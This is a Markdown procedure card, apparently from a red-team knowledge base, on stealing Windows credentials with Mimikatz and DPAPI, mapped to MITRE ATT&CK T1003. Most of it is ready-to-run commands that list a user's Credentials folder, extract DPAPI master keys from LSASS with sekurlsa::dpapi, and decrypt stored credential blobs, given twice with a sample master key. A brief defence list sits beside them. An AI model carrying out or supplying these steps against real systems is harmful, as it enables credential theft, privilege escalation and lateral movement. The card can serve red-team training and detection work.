---
id: ce9e713c-4c79-447e-b227-4e1a8e1c6510
name: Credential Theft with Mimikatz and DPAPI
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:27.480714+00:00'
updated_at: '2023-04-10T20:37:18.754637+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
tags:
- '[[Credential Manager & DPAPI]]'
- '[[Windows - Mimikatz]]'
commands:
- '[[Check folder for credentials]]'
- '[[Find master key]]'
- '[[Use master key to extract credentials]]'
- '[[Use Mimikatz to extract credentials]]'
---

# Credential Theft with Mimikatz and DPAPI

## Summary

Mimikatz is a powerful tool that can be used to extract plaintext passwords, hashes, PIN codes and Kerberos tickets from memory. It can also bypass DPAPI encryption and extract sensitive data stored in the Credential Manager. This technique can be used by an attacker to escalate privileges, move la

## Description

# Description

Mimikatz is a powerful tool that can be used to extract plaintext passwords, hashes, PIN codes and Kerberos tickets from memory. It can also bypass DPAPI encryption and extract sensitive data stored in the Credential Manager. This technique can be used by an attacker to escalate privileges, move laterally across the network and gain access to critical assets.

Technical Explanation: Mimikatz uses a variety of techniques to extract sensitive data from memory. It can target the LSASS process, which stores credentials used for authentication, or the Credential Manager, which stores usernames and passwords for various applications. Mimikatz can also bypass DPAPI encryption, which is used to protect sensitive data on Windows systems. This allows an attacker to extract plaintext passwords and other data that would otherwise be inaccessible.

Business Value: This technique can be used to steal credentials and gain access to critical assets, such as databases, financial systems and intellectual property. It can also be used to move laterally across the network and escalate privileges, which can lead to further compromise and data theft.

 

## Requirements

1. Local administrator access to the target system

1. Mimikatz tool

 

## Defense

1. Implement strong password policies and multi-factor authentication

1. Monitor for suspicious activity, such as unusual logins or credential dumping

1. Disable the storage of passwords in the Credential Manager

 

## Objectives

1. Extract plaintext passwords and other sensitive data from memory

1. Bypass DPAPI encryption and extract data from the Credential Manager

1. Escalate privileges and move laterally across the network

 

# Instructions

1. To retrieve Windows credentials with Mimikatz, follow these steps:
1. Check the folder to find credentials by running the command:
   dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*
2. Check the file with Mimikatz by running the command:
   $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
3. Find the master key by running the command:
   $ mimikatz !sekurlsa::dpapi
4. Use the master key to retrieve the credentials by running the command:
   $ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b

 



**Code**: [[# check the folder to find credentials
dir C:\User]]



> This command retrieves Windows credentials using Mimikatz. It first checks the folder to find the credentials, then uses Mimikatz to check the file and find the master key. Finally, the master key is used to retrieve the credentials.

Arguments:
- <username>: The username of the user whose credentials are being retrieved.



**Command** ([[Check folder for credentials]]):

```bash
dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*
```





**Command** ([[Use Mimikatz to extract credentials]]):

```bash
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
```





**Command** ([[Find master key]]):

```bash
$ mimikatz !sekurlsa::dpapi
```





**Command** ([[Use master key to extract credentials]]):

```bash
$ mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]

## Commands Used

- [[Check folder for credentials]]
- [[Find master key]]
- [[Use master key to extract credentials]]
- [[Use Mimikatz to extract credentials]]

## Tags

- [[Credential Manager & DPAPI]]
- [[Windows - Mimikatz]]


